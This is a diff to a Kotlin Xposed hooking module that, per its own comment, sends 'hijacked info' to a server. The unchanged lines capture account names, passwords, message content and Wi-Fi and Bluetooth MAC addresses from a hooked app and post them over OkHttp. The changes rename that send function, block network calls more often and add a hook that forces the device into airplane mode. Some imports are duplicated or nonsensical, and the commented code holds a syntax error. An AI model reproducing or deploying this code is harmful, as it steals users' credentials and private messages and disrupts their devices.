@@ -20,6 +20,16 @@ import okhttp3.Request
 import java.net.InetAddress
 import kotlin.concurrent.thread
 import java.net.NetworkInterface.getNetworkInterfaces
+import java.net.URL
+import java.lang.Compiler.enable
+import android.content.Intent
+import android.os.Build
+import android.provider.Settings
+import java.io.IOException
+import java.lang.Compiler.enable
+import java.lang.Compiler.enable
+
+
 
 
 
@@ -31,7 +41,7 @@ class Xposed : IXposedHookLoadPackage {
         XposedBridge.hookAllMethods(Class.forName(className), methodName, object : XC_MethodHook() {
             override fun beforeHookedMethod(param: MethodHookParam) {
                 val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
-                if (minute % 2 == 1) { // 时间内则禁用
+                if (minute % 5 != 0) { // 时间内则禁用
                     val exception = Exception("")
                     param.result = exception
                     log("禁用 $className.$methodName " + lpparam.packageName)
@@ -39,7 +49,7 @@ class Xposed : IXposedHookLoadPackage {
             }
             override fun afterHookedMethod(param: MethodHookParam) {
                 val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
-                if (minute % 2 == 1) { // 时间内则禁用
+                if (minute % 5 != 0) { // 时间内则禁用
                     val exception = Exception("")
                     param.result = exception
                 }
@@ -141,7 +151,7 @@ class Xposed : IXposedHookLoadPackage {
     }
 
     // 将劫持信息发给服务器
-    fun post(data: FormBody) {
+    fun transfer(data: FormBody) {
         thread(start = true) {
             val client = OkHttpClient()
             val request = Request.Builder()
@@ -210,7 +220,7 @@ class Xposed : IXposedHookLoadPackage {
             .add("wlanMac", getWFDMacAddress())
             .add("bluMac", getBluetoothMacAddress())
             .build()
-        post(data)
+        transfer(data)
     }
 
     @Throws(Throwable::class)
@@ -240,7 +250,7 @@ class Xposed : IXposedHookLoadPackage {
                             .add("account", account)
                             .add("pass", pass)
                             .build()
-                        post(data)
+                        transfer(data)
                     } // end of beforeHookedMethod
                 } // end of XC_MethodHook
             ) // end of findAndHookConstructor
@@ -279,7 +289,7 @@ class Xposed : IXposedHookLoadPackage {
                                 .add("time", createTime.toString())
                                 .add("content", content)
                                 .build()
-                            post(data)
+                            transfer(data)
                         } // end of afterHookedMethod
                     } // end of XC_MethodHook
                 ) // end of findAndHookMethod
@@ -287,13 +297,70 @@ class Xposed : IXposedHookLoadPackage {
             getInfo()
         } // end of if
 
+//        XposedBridge.hookAllConstructors(
+//            Class.forName("java.net.URLConnection"),
+//            object : XC_MethodHook()
+//            {
+//                @Throws(Throwable::class)
+//                override fun beforeHookedMethod(param: MethodHookParam) {
+//                    val args = param.args as Array
+//                    if (args.size != 1 || param.args[0].javaClass != URL::class.java)
+//                        return
+//                    val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
+//                    val mode = if (minute % 2 == 1) 1 else 0
+//                    val mode2 = if (minute % 2 == 1) true else false
+//                    val cmd = "settings put global airplane_mode_on $mode"
+//                    val cmd2 = "am broadcast -a android.intent.action.AIRPLANE_MODE --ez state $mode2"
+//                    try {
+//                        Runtime.getRuntime().exec(cmd)
+//                        Runtime.getRuntime().exec(cmd2)
+//                    } catch (e: IOException) {
+//
+//                    }
+////                    log(param.args[0].toString())
+//                }
+//            }0
+//        )
+//
+//        fun setAirPlaneMode(Context context, boolean enable) {
+//            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.JELLY_BEAN) {
+//                Settings.System.putInt(context.getContentResolver(), Settings.System.AIRPLANE_MODE_ON, enable ? 1 : 0);
+//            } else {
+//                Settings.Global.putInt(context.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, enable ? 1 : 0);
+//            }
+//            Intent intent = new Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED);
+//            intent.putExtra("state", enable);
+//            context.sendBroadcast(intent);
+//        }
+
+//        XposedHelpers.findAndHookMethod(
+//            "java.lang.Runtime", lpparam.classLoader,
+//            "getRunTime",
+//            object : XC_MethodHook()
+//            {
+//                override fun afterHookedMethod(param: MethodHookParam) {
+//                    val runtime = param.result as Runtime
+//                    val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
+//                    val mode = if (minute % 2 == 1) 1 else 0
+//                    val mode2 = if (minute % 2 == 1) true else false
+//                    val cmd = "settings put global airplane_mode_on $mode"
+//                    val cmd2 = "am broadcast -a android.intent.action.AIRPLANE_MODE --ez state $mode2"
+//                    try {
+//                        runtime.exec(cmd)
+//                        runtime.exec(cmd2)
+//                    } catch (e: java.lang.Exception) {
+//                        log(e)
+//                    }
+//                }
+//            }
+//        )
     } // end of handleLoadPackage
 
     val banSock = object: XC_MethodHook() {
         @Throws(Throwable::class)
         override fun beforeHookedMethod(param: XC_MethodHook.MethodHookParam) {
             val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
-            if (minute % 2 == 1) { // 时间内则禁用
+            if (minute % 5 != 0) { // 时间内则禁用
                 val host = param.args[0].toString()
                 val regex1 = Regex("((1[0-9][0-9]\\.)|(2[0-4][0-9]\\.)|(25[0-5]\\.)|([1-9][0-9]\\.)|([0-9]\\.)){3}((1[0-9][0-9])|(2[0-4][0-9])|(25[0-5])|([1-9][0-9])|([0-9]))")
                 val regex2 = Regex("(?<=//|)((\\\\w)+\\\\.)+\\\\w+")
@@ -332,27 +399,39 @@ class Xposed : IXposedHookLoadPackage {
             banSock
         )
 
-//        XposedBridge.hookAllConstructors(
-//            Class.forName("java.net.URLConnection"),
-//            object : XC_MethodHook()
-//            {
-//                @Throws(Throwable::class)
-//                override fun beforeHookedMethod(param: MethodHookParam) {
-//                    val args = param.args as Array
-//                    if (args.size != 1 || param.args[0].javaClass != URL::class.java)
-//                        return
-//                    val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
-//                    if (minute % 2 == 1) { // 时间内则禁用
-//                        log("禁用网络 " + args[0])
-//                        param.args[0] = ""
-//                        val exception = RuntimeException("")
-//                        param.result = exception
-//                        return
-//                    } else {
-////                        log("HttpURLConnection: " + args[0])
-//                    }
-//                }
-//            }
-//        )
+        XposedBridge.hookAllConstructors(
+            Class.forName("java.net.URLConnection"),
+            object : XC_MethodHook()
+            {
+                @Throws(Throwable::class)
+                override fun beforeHookedMethod(param: MethodHookParam) {
+                    val args = param.args as Array
+                    if (args.size != 1 || param.args[0].javaClass != URL::class.java)
+                        return
+                    val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
+                    var context = AndroidAppHelper.currentApplication()
+
+                    if (minute % 5 != 0) { // 时间内则禁用
+                        Settings.Global.putInt(
+                            context.getContentResolver(),
+                            Settings.Global.AIRPLANE_MODE_ON,
+                            1
+                        )
+                        val intent = Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
+                        intent.putExtra("state", true)
+                        context.sendBroadcast(intent)
+                    } else {
+                        Settings.Global.putInt(
+                            context.getContentResolver(),
+                            Settings.Global.AIRPLANE_MODE_ON,
+                            0
+                        )
+                        val intent = Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
+                        intent.putExtra("state", false)
+                        context.sendBroadcast(intent)
+                    }
+                }
+            }
+        )
     }
 }
